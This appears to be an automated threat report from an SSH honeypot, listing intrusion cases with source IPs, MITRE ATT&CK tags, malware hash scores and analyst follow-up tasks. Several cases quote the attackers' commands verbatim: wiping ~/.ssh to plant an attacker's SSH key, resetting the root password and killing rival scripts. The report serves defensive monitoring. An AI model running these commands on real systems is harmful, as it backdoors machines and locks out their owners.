| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 16:01:39` | `cowrie.session.connect` |
| `2026-05-25 16:01:39` | `cowrie.client.version` |
| `2026-05-25 16:01:39` | `cowrie.client.kex` |
| `2026-05-25 16:01:40` | `cowrie.login.success` |
| `2026-05-25 16:01:40` | `cowrie.session.params` |
| `2026-05-25 16:01:40` | `cowrie.command.input` |
| `2026-05-25 16:01:43` | `cowrie.command.input` |
| `2026-05-25 16:01:43` | `cowrie.command.input` |
| `2026-05-25 16:01:43` | `cowrie.command.input` |
| `2026-05-25 16:01:43` | `cowrie.command.input` |
| `2026-05-25 16:01:43` | `cowrie.command.input` |
| `2026-05-25 16:01:43` | `cowrie.command.input` |
| `2026-05-25 16:01:43` | `cowrie.command.failed` |
| `2026-05-25 16:01:43` | `cowrie.command.failed` |
| `2026-05-25 16:01:43` | `cowrie.log.closed` |
| `2026-05-25 16:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.66[.]123` to AbuseIPDB if not already reported
- [ ] Block `47.242.66[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c548cae2b7

| Field | Detail |
|---|---|
| **Source IP** | `4.210.186[.]201` |
| **First Seen** | 2026-05-25 16:01 |
| **Last Seen** | 2026-05-25 16:02 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wPBIeYSWo1Zq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 16:01:58` | `cowrie.session.connect` |
| `2026-05-25 16:01:58` | `cowrie.client.version` |
| `2026-05-25 16:01:59` | `cowrie.client.kex` |
| `2026-05-25 16:01:59` | `cowrie.login.success` |
| `2026-05-25 16:01:59` | `cowrie.session.params` |
| `2026-05-25 16:01:59` | `cowrie.command.input` |
| `2026-05-25 16:01:59` | `cowrie.command.failed` |
| `2026-05-25 16:02:00` | `cowrie.log.closed` |
| `2026-05-25 16:02:00` | `cowrie.session.params` |
| `2026-05-25 16:02:00` | `cowrie.command.input` |
| `2026-05-25 16:02:00` | `cowrie.session.file_download` |
| `2026-05-25 16:02:00` | `cowrie.log.closed` |
| `2026-05-25 16:02:16` | `cowrie.session.params` |
| `2026-05-25 16:02:16` | `cowrie.command.input` |
| `2026-05-25 16:02:17` | `cowrie.log.closed` |
| `2026-05-25 16:02:17` | `cowrie.session.params` |
| `2026-05-25 16:02:17` | `cowrie.command.input` |
| `2026-05-25 16:02:17` | `cowrie.log.closed` |
| `2026-05-25 16:02:17` | `cowrie.session.params` |
| `2026-05-25 16:02:17` | `cowrie.command.input` |
| `2026-05-25 16:02:17` | `cowrie.session.file_download` |
| `2026-05-25 16:02:17` | `cowrie.log.closed` |
| `2026-05-25 16:02:18` | `cowrie.session.params` |
| `2026-05-25 16:02:18` | `cowrie.command.input` |
| `2026-05-25 16:02:18` | `cowrie.log.closed` |
| `2026-05-25 16:02:18` | `cowrie.session.params` |
| `2026-05-25 16:02:18` | `cowrie.command.input` |
| `2026-05-25 16:02:18` | `cowrie.log.closed` |
| `2026-05-25 16:02:19` | `cowrie.session.params` |
| `2026-05-25 16:02:19` | `cowrie.command.input` |
| `2026-05-25 16:02:19` | `cowrie.command.input` |
| `2026-05-25 16:02:19` | `cowrie.log.closed` |
| `2026-05-25 16:02:19` | `cowrie.session.params` |
| `2026-05-25 16:02:19` | `cowrie.command.input` |
| `2026-05-25 16:02:19` | `cowrie.log.closed` |
| `2026-05-25 16:02:20` | `cowrie.session.params` |
| `2026-05-25 16:02:20` | `cowrie.command.input` |
| `2026-05-25 16:02:20` | `cowrie.log.closed` |
| `2026-05-25 16:02:20` | `cowrie.session.params` |
| `2026-05-25 16:02:20` | `cowrie.command.input` |
| `2026-05-25 16:02:20` | `cowrie.log.closed` |
| `2026-05-25 16:02:20` | `cowrie.session.params` |
| `2026-05-25 16:02:20` | `cowrie.command.input` |
| `2026-05-25 16:02:21` | `cowrie.log.closed` |
| `2026-05-25 16:02:21` | `cowrie.session.params` |
| `2026-05-25 16:02:21` | `cowrie.command.input` |
| `2026-05-25 16:02:21` | `cowrie.log.closed` |
| `2026-05-25 16:02:21` | `cowrie.session.params` |
| `2026-05-25 16:02:21` | `cowrie.command.input` |
| `2026-05-25 16:02:22` | `cowrie.log.closed` |
| `2026-05-25 16:02:22` | `cowrie.session.params` |
| `2026-05-25 16:02:22` | `cowrie.command.input` |
| `2026-05-25 16:02:22` | `cowrie.log.closed` |
| `2026-05-25 16:02:22` | `cowrie.session.params` |
| `2026-05-25 16:02:22` | `cowrie.command.input` |
| `2026-05-25 16:02:23` | `cowrie.log.closed` |
| `2026-05-25 16:02:23` | `cowrie.session.params` |
| `2026-05-25 16:02:23` | `cowrie.command.input` |
| `2026-05-25 16:02:23` | `cowrie.log.closed` |
| `2026-05-25 16:02:23` | `cowrie.session.params` |
| `2026-05-25 16:02:23` | `cowrie.command.input` |
| `2026-05-25 16:02:23` | `cowrie.log.closed` |
| `2026-05-25 16:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.210.186[.]201` to AbuseIPDB if not already reported
- [ ] Block `4.210.186[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1045532e72fb

| Field | Detail |
|---|---|
| **Source IP** | `67.205.134[.]251` |
| **First Seen** | 2026-05-25 16:03 |
| **Last Seen** | 2026-05-25 16:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 16:03:46` | `cowrie.session.connect` |
| `2026-05-25 16:03:46` | `cowrie.client.version` |
| `2026-05-25 16:03:47` | `cowrie.client.kex` |
| `2026-05-25 16:03:47` | `cowrie.login.success` |
| `2026-05-25 16:03:48` | `cowrie.session.params` |
| `2026-05-25 16:03:48` | `cowrie.command.input` |
| `2026-05-25 16:03:48` | `cowrie.command.failed` |
| `2026-05-25 16:03:48` | `cowrie.log.closed` |
| `2026-05-25 16:03:48` | `cowrie.session.params` |
| `2026-05-25 16:03:48` | `cowrie.command.input` |
| `2026-05-25 16:03:49` | `cowrie.session.file_download` |
| `2026-05-25 16:03:49` | `cowrie.log.closed` |
| `2026-05-25 16:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.205.134[.]251` to AbuseIPDB if not already reported
- [ ] Block `67.205.134[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9ffcb268b9

| Field | Detail |
|---|---|
| **Source IP** | `67.205.134[.]251` |
| **First Seen** | 2026-05-25 16:03 |
| **Last Seen** | 2026-05-25 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 16:03:51` | `cowrie.session.connect` |
| `2026-05-25 16:03:51` | `cowrie.client.version` |
| `2026-05-25 16:03:51` | `cowrie.client.kex` |
| `2026-05-25 16:03:52` | `cowrie.login.success` |
| `2026-05-25 16:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.205.134[.]251` to AbuseIPDB if not already reported
- [ ] Block `67.205.134[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab5983576e2

| Field | Detail |
|---|---|
| **Source IP** | `213.35.128[.]24` |
| **First Seen** | 2026-05-25 17:00 |
| **Last Seen** | 2026-05-25 17:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 17:00:11` | `cowrie.session.connect` |
| `2026-05-25 17:00:11` | `cowrie.client.version` |
| `2026-05-25 17:00:11` | `cowrie.client.kex` |
| `2026-05-25 17:00:13` | `cowrie.login.success` |
| `2026-05-25 17:00:13` | `cowrie.session.params` |
| `2026-05-25 17:00:13` | `cowrie.command.input` |
| `2026-05-25 17:00:13` | `cowrie.command.failed` |
| `2026-05-25 17:00:14` | `cowrie.log.closed` |
| `2026-05-25 17:00:14` | `cowrie.session.params` |
| `2026-05-25 17:00:14` | `cowrie.command.input` |
| `2026-05-25 17:00:15` | `cowrie.session.file_download` |
| `2026-05-25 17:00:15` | `cowrie.log.closed` |
| `2026-05-25 17:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.35.128[.]24` to AbuseIPDB if not already reported
- [ ] Block `213.35.128[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e760e46b8f68

| Field | Detail |
|---|---|
| **Source IP** | `213.35.128[.]24` |
| **First Seen** | 2026-05-25 17:00 |
| **Last Seen** | 2026-05-25 17:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 17:00:18` | `cowrie.session.connect` |
| `2026-05-25 17:00:18` | `cowrie.client.version` |
| `2026-05-25 17:00:19` | `cowrie.client.kex` |
| `2026-05-25 17:00:20` | `cowrie.login.success` |
| `2026-05-25 17:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.35.128[.]24` to AbuseIPDB if not already reported
- [ ] Block `213.35.128[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4e56c836e8

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-05-25 17:01 |
| **Last Seen** | 2026-05-25 17:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 17:01:32` | `cowrie.session.connect` |
| `2026-05-25 17:01:32` | `cowrie.client.version` |
| `2026-05-25 17:01:32` | `cowrie.client.kex` |
| `2026-05-25 17:01:34` | `cowrie.login.success` |
| `2026-05-25 17:01:34` | `cowrie.session.params` |
| `2026-05-25 17:01:34` | `cowrie.command.input` |
| `2026-05-25 17:01:34` | `cowrie.command.failed` |
| `2026-05-25 17:01:35` | `cowrie.log.closed` |
| `2026-05-25 17:01:36` | `cowrie.session.params` |
| `2026-05-25 17:01:36` | `cowrie.command.input` |
| `2026-05-25 17:01:36` | `cowrie.session.file_download` |
| `2026-05-25 17:01:36` | `cowrie.log.closed` |
| `2026-05-25 17:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-702cb93e9092

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-05-25 17:01 |
| **Last Seen** | 2026-05-25 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 17:01:40` | `cowrie.session.connect` |
| `2026-05-25 17:01:40` | `cowrie.client.version` |
| `2026-05-25 17:01:40` | `cowrie.client.kex` |
| `2026-05-25 17:01:42` | `cowrie.login.success` |
| `2026-05-25 17:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f12f9da034

| Field | Detail |
|---|---|
| **Source IP** | `180.76.137[.]37` |
| **First Seen** | 2026-05-25 17:43 |
| **Last Seen** | 2026-05-25 17:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 17:43:43` | `cowrie.session.connect` |
| `2026-05-25 17:43:43` | `cowrie.client.version` |
| `2026-05-25 17:43:44` | `cowrie.client.kex` |
| `2026-05-25 17:43:46` | `cowrie.login.success` |
| `2026-05-25 17:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.137[.]37` to AbuseIPDB if not already reported
- [ ] Block `180.76.137[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b906afade06

| Field | Detail |
|---|---|
| **Source IP** | `180.76.137[.]37` |
| **First Seen** | 2026-05-25 17:44 |
| **Last Seen** | 2026-05-25 17:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 17:44:17` | `cowrie.session.connect` |
| `2026-05-25 17:44:17` | `cowrie.client.version` |
| `2026-05-25 17:44:18` | `cowrie.client.kex` |
| `2026-05-25 17:44:19` | `cowrie.login.success` |
| `2026-05-25 17:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.137[.]37` to AbuseIPDB if not already reported
- [ ] Block `180.76.137[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.184.30[.]99` | **13** | 2026-05-25 16:18 | 2026-05-25 16:48 | 26m | 0 | `T1592` | 🟠 MEDIUM |
| `20.123.146[.]94` | **5** | 2026-05-25 15:44 | 2026-05-25 16:00 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `4.210.186[.]201` | **4** | 2026-05-25 15:40 | 2026-05-25 15:57 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.125[.]122` | **2** | 2026-05-25 15:40 | 2026-05-25 15:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | **2** | 2026-05-25 16:43 | 2026-05-25 17:25 | 1m | 0 | `T1592` | 🟢 LOW |
| `179.215.90[.]26` | 1 | 2026-05-25 15:42 | 2026-05-25 15:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.10.86[.]130` | 1 | 2026-05-25 17:01 | 2026-05-25 17:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.123.146[.]92` | 1 | 2026-05-25 15:42 | 2026-05-25 15:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.91.200[.]244` | 1 | 2026-05-25 17:08 | 2026-05-25 17:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `213.35.128[.]24` | 1 | 2026-05-25 17:00 | 2026-05-25 17:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `179.215.90[.]26` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 3 |
| `213.35.128[.]24` | EE | Telia Eesti AS | **100** ⚠️ | 26 |
| `47.242.66[.]123` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 13 |
| `4.210.186[.]201` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `186.10.86[.]130` | CL | ENTEL CHILE S.A. | **100** ⚠️ | 50 |
| `210.91.200[.]244` | KR | Korea Telecom | **100** ⚠️ | 38 |
| `180.76.137[.]37` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 6 |
| `20.123.146[.]92` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `20.123.146[.]94` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `135.237.125[.]122` | US | Microsoft Limited | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 46 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 25 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 85 cases |
| Tool 34  | Credential Extractor        | ✅ 32 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (42.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
